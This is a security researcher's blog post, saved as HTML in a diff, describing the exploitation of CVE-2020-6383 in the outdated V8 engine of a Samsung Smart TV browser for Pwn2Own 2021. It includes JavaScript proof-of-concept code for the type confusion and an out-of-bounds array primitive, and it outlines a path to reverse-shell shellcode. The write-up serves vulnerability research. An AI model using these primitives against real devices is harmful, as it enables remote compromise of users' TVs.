@@ -1,0 +1,629 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Pwning the Samsung TV - iam.chi</title>
+<meta name="description" content="Overview">
+
+
+  <meta name="author" content="Chi Tran">
+  
+  <meta property="article:author" content="Chi Tran">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="iam.chi">
+<meta property="og:title" content="Pwning the Samsung TV">
+<meta property="og:url" content="http://localhost:4000/research/2022/01/28/pwning-the-samsung-tv.html">
+
+
+  <meta property="og:description" content="Overview">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2022-01-28T00:00:00-06:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/research/2022/01/28/pwning-the-samsung-tv.html">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": null,
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="iam.chi Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          iam.chi
+          
+        </a>
+        <ul class="visible-links"></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/images/bio-photo.jpg" alt="Chi Tran" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Chi Tran</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Hey! I am Chi | Father of 2 | Security Engineer | I love cooking and spicy noodles.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="mailto:research@ctrsec.io" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/remote-code-execution/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/imspciynoodles" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Pwning the Samsung TV">
+    <meta itemprop="description" content="Overview">
+    <meta itemprop="datePublished" content="2022-01-28T00:00:00-06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Pwning the Samsung TV
+</h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <h2 id="overview">Overview</h2>
+
+<p>Next, following up on the “failed” Pwn2Own 2021 series, this blog post will be talking about the vulnerability found on Samsung TV - a Pwn2Own 2021 target.</p>
+
+<h2 id="vulnerability-summary">Vulnerability Summary</h2>
+
+<p>The default browser of Samsung Smart TV is chromium-based with obsolete version. So we use 1-day CVE-2020-6383 to exploit this device over this default browser. When user browse malicious content on the device’s browser, we can use this bug to run shellcode and obtain reverse shell connection from device.</p>
+
+<h2 id="vulnerability-detail">Vulnerability Detail</h2>
+
+<p>The vulnerability is in JavaScript engine (V8) that used by default browser. When JS engine try to optimize this pattern of JS code:</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="nx">initial</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="nx">end</span><span class="p">;</span> <span class="nx">i</span><span class="o">+=</span><span class="nx">increment</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">...</span>
+<span class="p">}</span>
+
+<span class="nx">The</span> <span class="kd">function</span> <span class="o">**</span><span class="nx">Typer</span><span class="p">::</span><span class="nx">Visitor</span><span class="p">::</span><span class="nx">TypeInductionVariablePhi</span><span class="o">**</span> <span class="nx">is</span> <span class="nx">called</span> <span class="nx">to</span> <span class="kd">get</span> <span class="nx">type</span> <span class="k">of</span> <span class="o">**</span><span class="nx">i</span><span class="o">**</span>
+
+<span class="nx">Type</span> <span class="nx">Typer</span><span class="p">::</span><span class="nx">Visitor</span><span class="p">::</span><span class="nx">TypeInductionVariablePhi</span><span class="p">(</span><span class="nx">Node</span><span class="err">\</span><span class="o">*</span> <span class="nx">node</span><span class="p">)</span> <span class="p">{</span>
+<span class="err">\</span><span class="p">[...</span><span class="err">\</span><span class="p">]</span>
+  <span class="kd">const</span> <span class="nx">bool</span> <span class="nx">both</span><span class="err">\</span><span class="nx">_types</span><span class="err">\</span><span class="nx">_integer</span> <span class="o">=</span> <span class="nx">initial</span><span class="err">\</span><span class="nx">_type</span><span class="p">.</span><span class="nx">Is</span><span class="p">(</span><span class="nx">typer</span><span class="err">\</span><span class="nx">_</span><span class="o">-&gt;</span><span class="nx">cache</span><span class="err">\</span><span class="nx">_</span><span class="o">-&gt;</span><span class="nx">kInteger</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+                                  <span class="nx">increment</span><span class="err">\</span><span class="nx">_type</span><span class="p">.</span><span class="nx">Is</span><span class="p">(</span><span class="nx">typer</span><span class="err">\</span><span class="nx">_</span><span class="o">-&gt;</span><span class="nx">cache</span><span class="err">\</span><span class="nx">_</span><span class="o">-&gt;</span><span class="nx">kInteger</span><span class="p">);</span>
+  <span class="nx">bool</span> <span class="nx">maybe</span><span class="err">\</span><span class="nx">_nan</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+  <span class="c1">// The addition or subtraction could still produce a NaN, if the integer</span>
+  <span class="c1">// ranges touch infinity.</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">both</span><span class="err">\</span><span class="nx">_types</span><span class="err">\</span><span class="nx">_integer</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">Type</span> <span class="nx">resultant</span><span class="err">\</span><span class="nx">_type</span> <span class="o">=</span>
+        <span class="p">(</span><span class="nx">arithmetic</span><span class="err">\</span><span class="nx">_type</span> <span class="o">==</span> <span class="nx">InductionVariable</span><span class="p">::</span><span class="nx">ArithmeticType</span><span class="p">::</span><span class="nx">kAddition</span><span class="p">)</span>
+            <span class="p">?</span> <span class="nx">typer</span><span class="err">\</span><span class="nx">_</span><span class="o">-&gt;</span><span class="nx">operation</span><span class="err">\</span><span class="nx">_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="nx">NumberAdd</span><span class="p">(</span><span class="nx">initial</span><span class="err">\</span><span class="nx">_type</span><span class="p">,</span> <span class="nx">increment</span><span class="err">\</span><span class="nx">_type</span><span class="p">)</span>
+            <span class="p">:</span> <span class="nx">typer</span><span class="err">\</span><span class="nx">_</span><span class="o">-&gt;</span><span class="nx">operation</span><span class="err">\</span><span class="nx">_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="nx">NumberSubtract</span><span class="p">(</span><span class="nx">initial</span><span class="err">\</span><span class="nx">_type</span><span class="p">,</span>
+                                                        <span class="nx">increment</span><span class="err">\</span><span class="nx">_type</span><span class="p">);</span>
+    <span class="nx">maybe</span><span class="err">\</span><span class="nx">_nan</span> <span class="o">=</span> <span class="nx">resultant</span><span class="err">\</span><span class="nx">_type</span><span class="p">.</span><span class="nx">Maybe</span><span class="p">(</span><span class="nx">Type</span><span class="p">::</span><span class="kc">NaN</span><span class="p">());</span> <span class="c1">// \*\*\* 1 \*\*\*</span>
+  <span class="p">}</span>
+
+<span class="err">\</span><span class="p">[...</span><span class="err">\</span><span class="p">]</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="nx">arithmetic</span><span class="err">\</span><span class="nx">_type</span> <span class="o">==</span> <span class="nx">InductionVariable</span><span class="p">::</span><span class="nx">ArithmeticType</span><span class="p">::</span><span class="nx">kAddition</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">increment</span><span class="err">\</span><span class="nx">_min</span> <span class="o">=</span> <span class="nx">increment</span><span class="err">\</span><span class="nx">_type</span><span class="p">.</span><span class="nx">Min</span><span class="p">();</span>
+    <span class="nx">increment</span><span class="err">\</span><span class="nx">_max</span> <span class="o">=</span> <span class="nx">increment</span><span class="err">\</span><span class="nx">_type</span><span class="p">.</span><span class="nx">Max</span><span class="p">();</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">DCHECK</span><span class="err">\</span><span class="nx">_EQ</span><span class="p">(</span><span class="na">InductionVariable</span><span class="p">::</span><span class="na">ArithmeticType</span><span class="p">::</span><span class="nx">kSubtraction</span><span class="p">,</span> <span class="nx">arithmetic</span><span class="err">\</span><span class="nx">_type</span><span class="p">);</span>
+    <span class="nx">increment</span><span class="err">\</span><span class="nx">_min</span> <span class="o">=</span> <span class="o">-</span><span class="nx">increment</span><span class="err">\</span><span class="nx">_type</span><span class="p">.</span><span class="nx">Max</span><span class="p">();</span>
+    <span class="nx">increment</span><span class="err">\</span><span class="nx">_max</span> <span class="o">=</span> <span class="o">-</span><span class="nx">increment</span><span class="err">\</span><span class="nx">_type</span><span class="p">.</span><span class="nx">Min</span><span class="p">();</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="nx">increment</span><span class="err">\</span><span class="nx">_min</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+<span class="err">\</span><span class="p">[...</span><span class="err">\</span><span class="p">]</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">increment</span><span class="err">\</span><span class="nx">_max</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="err">\</span><span class="p">[...</span><span class="err">\</span><span class="p">]</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="c1">// Shortcut: If the increment can be both positive and negative, // the variable can go arbitrarily far, so just return integer. return typer\_-&gt;cache\_-&gt;kInteger; // \*\*\* 2 \*\*\*</span>
+  <span class="p">}</span></code></pre></figure>
+
+<p>The code assumes that when the <strong>increment</strong> variable can be both positive and negative, the result type of <strong>i</strong> will be <strong>kInteger</strong> (which doesn’t include <strong>NaN</strong>). However, since the value of <strong>increment</strong> can be changed from inside the loop body, it’s possible, for example, to set <strong>i = 0</strong> and <strong>increment = -Infinity</strong>, and then set <strong>increment</strong> to <strong>+Infinity</strong> inside the for loop. This will make <strong>i</strong> become <strong>NaN</strong> in the next iteration of the loop. This leads to type mismatch of variable i, engine thinks its type is <strong>kInteger</strong> (not include <strong>NaN</strong>) but it can be <strong>NaN</strong>. Here is the proof-of-concept:</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="mi">1</span><span class="p">;</span> <span class="nx">i</span><span class="o">+=</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">)</span> <span class="p">{</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">+</span><span class="kc">Infinity</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">++</span><span class="nx">k</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<h2 id="vulnerability-exploitation">Vulnerability Exploitation</h2>
+
+<p>The bug leads to mismatch type of <strong>i</strong> in optimization engine and actual value of <strong>i</strong>. Actual value of <strong>i</strong> is <strong>NaN</strong>, while optimization engine decides value of <strong>i</strong> is of type <strong>kInteger</strong>. We use this value as a <strong>length</strong> to construct a JS array. This mismatch of <strong>length</strong> value makes the <strong>length</strong> field is larger than the capacity of its backing store, leading an out-of-bound read/write to this array.</p>
+
+<p>Below is a Proof-of-concept that creates OOB read/write JS array</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript">                                       <span class="c1">// i: kInteger &gt; \[-Infinity, Infinity\]</span>
+    <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>     <span class="c1">// \[1024, Infinity\]</span>
+    <span class="nx">value</span> <span class="o">=</span> <span class="o">-</span><span class="nx">value</span><span class="p">;</span>                    <span class="c1">// \[-Infinity, -1024\]</span>
+    <span class="nx">value</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="o">-</span><span class="mi">1025</span><span class="p">);</span>    <span class="c1">// \[-1025, -1024\]</span>
+    <span class="nx">value</span> <span class="o">=</span> <span class="o">-</span><span class="nx">value</span><span class="p">;</span>                    <span class="c1">// \[1024, 1025\]</span>
+    <span class="nx">value</span> <span class="o">-=</span> <span class="mi">1022</span><span class="p">;</span>                     <span class="c1">// \[2, 3\]</span>
+    <span class="nx">value</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>                       <span class="c1">// 0</span>
+    <span class="nx">value</span> <span class="o">+=</span> <span class="mi">10</span><span class="p">;</span>                       <span class="c1">// 10</span>
+
+    <span class="kd">var</span> <span class="nx">array</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
+    <span class="nx">array</span><span class="err">\</span><span class="p">[</span><span class="mi">0</span><span class="err">\</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span></code></pre></figure>
+
+<p>In optimization engine, the <strong>value</strong> of value is predicted to be 10. But the actual value is very large number because of mismatch type of <strong>i</strong></p>
+
+<p>Additionally, JS array operator is optimized also. It uses actual value of <strong>value</strong> as a length but the backing store is create with the predicted value that much more smaller than length. So we can get OOB read/write to this new JS array. Use this array we can get an arbitrary read/write primitive. Final we use RWX page of WASM to run our connect-back shell-code.</p>
+
+<h2 id="timeline">Timeline</h2>
+
+<p>10/29/2021: Exploit submitted to Pwn2Own Competition</p>
+
+<p>11/01/2021: Submission got rejected due to the usage of n-day</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-01-28T00:00:00-06:00">January 28, 2022</time></p>
+
+
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=Pwning+the+Samsung+TV%20http%3A%2F%2Flocalhost%3A4000%2Fresearch%2F2022%2F01%2F28%2Fpwning-the-samsung-tv.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fresearch%2F2022%2F01%2F28%2Fpwning-the-samsung-tv.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fresearch%2F2022%2F01%2F28%2Fpwning-the-samsung-tv.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/research/2022/01/21/pwning-facebook-portal.html" class="pagination--pager" title="Pwning the Facebook Portal
+">Previous</a>
+    
+    
+      <a href="/jekyll/update/2023/01/26/welcome-to-jekyll.html" class="pagination--pager" title="Welcome to Jekyll!
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/jekyll/update/2023/01/26/welcome-to-jekyll.html" rel="permalink">Welcome to Jekyll!
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different wa...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/research/2022/01/21/pwning-facebook-portal.html" rel="permalink">Pwning the Facebook Portal
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Overview
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/bug-hunting/2021/12/19/python-deserialization-on-integrated-aws-ddb-flask-app.html" rel="permalink">Python Deserialization on Integrated AWS DDB Flask App
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Cách đây vài hôm mình có gặp một challenge hay ho khi làm Bug Bounty ở nền Cloud &amp;&amp; Web. Tuy flow xử lý data không có gì là mới, nhưng việc applicati...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/security-research/2021/09/29/weak-key-cryptography-in-real-world-english.html" rel="permalink">[English] How I faked tons of COVID passes — “Weak Key Cryptography in real world”
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">I. SUMMARY
+
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 iam.chi. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
